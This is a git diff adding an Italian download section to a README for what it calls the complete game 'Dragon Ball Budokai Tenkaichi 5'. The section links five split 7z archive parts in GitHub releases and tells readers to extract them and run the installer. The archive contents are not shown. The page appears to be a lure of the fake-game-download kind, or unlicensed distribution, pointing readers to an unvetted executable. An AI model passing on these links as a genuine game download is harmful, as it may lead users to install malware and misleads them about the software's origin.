@@ -1,5 +1,19 @@
 ![Dragon Ball Budokai Tenkaichi 5](https://raw.githubusercontent.com/ibosortino-cmd/bt5-gioco-completo/main/media/banner-bt5.png)
 
+## ⬇️ Scarica subito il gioco completo
+
+**Scarica tutte e cinque le parti nella stessa cartella:**
+
+- **[Scarica PARTE 1/5 — Budokai-Tenkaichi-5.7z.001](https://github.com/ibosortino-cmd/bt5-gioco-completo/releases/download/completo-2026.10.24/Budokai-Tenkaichi-5.7z.001)**
+- **[Scarica PARTE 2/5 — Budokai-Tenkaichi-5.7z.002](https://github.com/ibosortino-cmd/bt5-gioco-completo/releases/download/completo-2026.10.24/Budokai-Tenkaichi-5.7z.002)**
+- **[Scarica PARTE 3/5 — Budokai-Tenkaichi-5.7z.003](https://github.com/ibosortino-cmd/bt5-gioco-completo/releases/download/completo-2026.10.24/Budokai-Tenkaichi-5.7z.003)**
+- **[Scarica PARTE 4/5 — Budokai-Tenkaichi-5.7z.004](https://github.com/ibosortino-cmd/bt5-gioco-completo/releases/download/completo-2026.10.24/Budokai-Tenkaichi-5.7z.004)**
+- **[Scarica PARTE 5/5 — Budokai-Tenkaichi-5.7z.005](https://github.com/ibosortino-cmd/bt5-gioco-completo/releases/download/completo-2026.10.24/Budokai-Tenkaichi-5.7z.005)**
+
+Dopo il download, apri **solo la parte `.001` con 7-Zip** e premi **Estrai**. Le altre parti vengono unite automaticamente. Avvia l’installatore dalla cartella estratta.
+
+---
+
 # Budokai Tenkaichi 5 — Gioco completo
 
 ## ⬇️ [SCARICA IL GIOCO COMPLETO](https://github.com/ibosortino-cmd/bt5-gioco-completo/releases/latest)
